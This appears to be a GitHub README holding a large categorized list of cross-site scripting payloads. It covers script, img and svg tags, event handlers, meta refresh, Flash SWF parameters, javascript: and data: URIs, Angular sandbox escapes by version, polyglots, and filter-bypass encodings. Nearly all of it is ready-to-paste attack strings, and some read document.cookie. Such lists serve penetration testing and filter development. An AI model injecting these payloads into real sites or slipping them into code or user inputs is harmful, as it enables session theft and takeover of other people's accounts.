# xss-payloads
huge xss payloads list with category 

#Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>

#Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

#Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)

#HTML Payload

<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>

#XSS in META tag

Base64 encoded
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">

<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>

With an additional URL
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
XSS in flash application

flashmediaelement.swf?jsinitfunctio%gn=alert`1`
flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
plupload.flash.swf?%#target%g=alert&uid%g=XSS&
moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
video-js.swf?readyFunction=alert(1)
player.swf?playerready=alert(document.cookie)
player.swf?tracecall=alert(document.cookie)
banner.swf?clickTAG=javascript:alert(1);//
io.swf?yid=\"));}catch(e){alert(1);}//
video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4

#DOM XSS

#"><img src=/ onerror=alert(2)>

#XSS with javascript:

javascript:prompt(1)

%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

We can encode the "javacript:" in Hex/Octal
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)

We can use a 'newline character'
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)

Using the escape character
 \j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

Using the newline and a comment //
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)

#XSS with data:

data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+

#XSS with vbscript: only IE

vbscript:msgbox("XSS")
XSS in files
XSS in XML

<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>

#XSS in SVG

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert(document.domain);
   </script>
</svg>

#XSS in SVG (short)

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

#XSS in SWF

Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);


InsecureFlashFile.swf
location to url: InsecureFlashFile.swf?a=location&c=http://www.google.com/
open url to new window: InsecureFlashFile.swf?a=open&c=http://www.google.com/
http request to url: InsecureFlashFile.swf?a=get&c=http://www.google.com/
eval js codz: InsecureFlashFile.swf?a=eval&c=alert(document.domain)
more payloads in ./files

#XSS in Angular
Angular 1.6.0

{{0[a='constructor'][a]('alert(1)')()}}
Angular 1.5.9

{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
Angular 1.5.0 - 1.5.8

{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
Angular 1.4.0 - 1.4.9

{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
Angular 1.3.20

{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
Angular 1.3.19

{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
    $eval('x=alert(1)//');
}}
Angular 1.3.3 - 1.3.18

{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
Angular 1.3.1 - 1.3.2

{{
    {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charAt=''.valueOf;
    $eval('x=alert(1)//');
}}
Angular 1.3.0

{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(toString.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueOf = call) &&
        (''+''.toString(
          'F = Function.prototype;' +
          'F.apply = F.a;' +
          'delete F.a;' +
          'delete F.valueOf;' +
          'alert(1);'
        ))
    );}}
Angular 1.2.24 - 1.2.29

{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
Angular 1.2.19 - 1.2.23

{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
Angular 1.2.6 - 1.2.18

{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
Angular 1.2.2 - 1.2.5

{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
Angular 1.2.0 - 1.2.1

{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
Angular 1.0.1 - 1.1.5

{{constructor.constructor('alert(1)')()}}

#Polyglot XSS
#Polyglot XSS - 0xsobky

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

#Polyglot XSS - Ashar Javed

 ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
#Polyglot XSS - Mathias Karlsson

" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
#Polyglot XSS - Rsnake

';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
#Polyglot XSS - Daniel Miessler

javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
Filter Bypass and exotic payloads

#Bypass case sensitive

<sCrIpt>alert(1)</ScRipt>

#Bypass quotes for string

String.fromCharCode(88,83,83)

#Bypass quotes in script tag

http://localhost/bla.php?test=</script><script>alert(1)</script>
<html>
  <script>
    <?php echo 'foo="text '.$_GET['test'].'";';`?>
  </script>
</html>
Bypass quotes in mousedown event

<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>

You can bypass a single quote with &#39; in an on mousedown event handler

#Bypass dot filter

<script>window['alert'](document['domain'])<script>
Bypass parenthesis for string - Firefox

alert`1`

#Bypass onxxxx= blacklist

<object onafterscriptexecute=confirm(0)>
<object onbeforescriptexecute=confirm(0)>
Bypass onxxx= filter with a null byte/vertical tab - IE/Safari

<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />
Bypass onxxx= filter with a '/' - IE/Firefox/Chrome/Safari

<img src='1' onerror/=alert(0) />

#Bypass space filter with "/" - IE/Firefox/Chrome/Safari

<img/src='1'/onerror=alert(0)>
Bypass with incomplete html tag - IE/Firefox/Chrome/Safari

<img src='1' onerror='alert(0)' <
Bypass document blacklist

<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
Bypass using javascript inside a string

<script>
foo="text </script><script>alert(1)</script>";
</script>
Bypass using an alternate way to execute an alert

<script>window['alert'](0)</script>
<script>parent['alert'](1)</script>
<script>self['alert'](2)</script>
<script>top['alert'](3)</script>
<script>this['alert'](4)</script>
<script>frames['alert'](5)</script>
<script>content['alert'](6)</script>

#Bypass using an alternate way to trigger an alert

var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
         if (exec_original) {
            return proxy.apply(this, arguments);
         }
      };
      XSSObject.lockdown(obj, name);
   };
XSSObject.proxy(window, 'alert', 'window.alert', false);
Bypass ';' using another character

'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
Bypass using Unicode

Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
transformed into U+003C LESS­THAN SIGN (<)

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")

Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')

Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
transformed into U+003C LESS­THAN SIGN (<)

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")

Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')

E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
%EF%BC%9E becomes >
%EF%BC%9C becomes <
Bypass using Unicode converted to uppercase

İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k

<ſvg onload=... > become <SVG ONLOAD=...>
<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
Bypass using overlong UTF-8

< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
